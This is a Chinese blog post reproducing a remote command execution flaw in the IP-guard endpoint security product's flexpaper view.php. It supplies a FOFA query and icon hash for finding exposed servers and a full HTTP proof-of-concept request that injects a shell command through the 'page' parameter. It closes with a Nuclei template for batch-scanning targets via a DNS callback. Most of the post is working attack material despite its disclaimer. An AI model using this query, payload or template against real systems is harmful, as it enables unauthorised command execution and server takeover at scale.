# 原创
：  漏洞复现--IP-guard flexpaper RCE

# 漏洞复现--IP-guard flexpaper RCE

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

IP-guard是由溢信科技股份有限公司开发的一款终端安全管理软件，旨在帮助企业保护终端设备安全、数据安全、管理网络使用和简化IT系统管理。该产品存在远程命令执行漏洞。攻击者可利用该漏洞执行任意命令直接获取服务器权限。

### 二：漏洞影响版本

IP-guard

### 三：网络空间测绘查询

fofa:<br/> `"IP-guard" &amp;&amp; icon_hash="2030860561"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/d2622193c56292b652b5edb17f12883a.jpeg"/>

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/b7a28d60c5a620483e8f7b4639200e17.jpeg"/><br/> POC:

```
GET /ipg/static/appr/lib/flexpaper/php/view.php?doc=11.jpg&amp;format=swf&amp;isSplit=true&amp;page=||ping%20DNSlog HTTP/1.1
Host: x.x.x.x
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: yourCookie
Connection: close

```

ping后加上dnslog验证。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/1340d7c6af3b3c195ab5aa9ce7af0c23.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/fdbab1d37f12e2783be7a786419231b4.jpeg"/>

### 五：批量检测

```
id: ip-guard-webserver-rce

info:
  name: IP-Guard Webserver 远程命令执行
  author: xingyun
  severity: critical
  description: |
    IP-guard是由溢信科技股份有限公司开发的一款终端安全管理软件，旨在帮助企业保护终端设备安全、数据安全、管理网络使用和简化IT系统管理。
    IP-guard WebServer远程命令执行漏洞。攻击者可利用该漏洞执行任意命令，获取服务器控制权限。
    "IP-guard" &amp;&amp; icon_hash="2030860561"
  reference:
    - MDPOCS/Ip_Guard_Webserver_View_Rce_Poc.py at 35788...
  tags: rce,ipguard

http:
  - raw:
      - |
        GET /ipg/static/appr/lib/flexpaper/php/view.php?doc=11.jpg&amp;format=swf&amp;isSplit=true&amp;page=||ping%20{{interactsh-url}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"

    extractors:
      - type: kval
        kval:
          - interactsh_ip # Print remote interaction IP in output

```
